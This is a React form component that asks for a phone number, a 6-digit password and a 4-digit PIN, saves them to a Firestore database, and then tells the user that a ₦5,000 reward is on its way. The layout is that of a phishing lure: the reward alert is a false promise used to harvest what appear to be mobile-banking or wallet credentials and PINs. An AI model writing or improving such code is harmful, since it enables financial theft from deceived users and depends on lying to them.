import React, { useState } from "react";
import { saveUserDetails } from "../src/utils/firestore"; // Adjust path if needed

const UserForm = () => {
  const [user, setUser] = useState({ phoneNumber: "", password: "", pin: "" });

  const handleChange = (e) => {
    setUser({ ...user, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    await saveUserDetails(user);
    alert("Congratulations, your reward of ₦5,000 is on the way into your account 🎉.");
    setUser({ phoneNumber: "", password: "", pin: "" }); // Reset form
  };

  return (
    <div>
      <h2>Save User Details</h2>
      <form onSubmit={handleSubmit}>
        <input type="text" name="phoneNumber" placeholder="Phone Number" value={user.phoneNumber} onChange={handleChange} required />
        <input type="password" name="password" placeholder="Password (6 digits)" value={user.password} onChange={handleChange} required />
        <input type="password" name="pin" placeholder="PIN (4 digits)" value={user.pin} onChange={handleChange} required />
        <button type="submit">Save</button>
      </form>
    </div>
  );
};

export default UserForm;
